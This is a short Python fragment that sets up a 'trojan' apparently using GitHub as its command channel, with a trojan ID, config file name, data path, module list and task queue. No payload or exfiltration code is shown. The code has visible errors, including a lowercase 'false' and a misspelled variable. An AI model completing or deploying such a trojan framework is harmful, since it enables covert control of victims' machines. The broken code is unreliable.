import json
import base64
import sys
import time
import imp
import random
import threading
import queue as Queue
import os

from github3 import login

trojan_id = "abc"

trojan_confing ="%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_models = []
configured = false
task_queue = Queue.Queue()
